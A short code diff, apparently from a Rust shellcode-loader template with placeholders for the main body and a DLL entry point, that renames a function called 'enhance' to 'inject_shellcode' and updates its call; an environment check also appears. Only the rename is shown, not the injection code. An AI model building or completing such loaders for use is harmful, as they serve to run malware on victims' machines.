@@ -42,7 +42,7 @@ fn check_environment() -> bool {
 }
 
 
-fn enhance(mut buf: Vec<u8>) {
+fn inject_shellcode(mut buf: Vec<u8>) {
     unsafe {
         let buf_len = buf.len();
 
@@ -91,7 +91,7 @@ fn main() {
 
     {{MAIN}}
 
-    enhance(vec);
+    inject_shellcode(vec);
 }
 
 {{DLL_MAIN}}
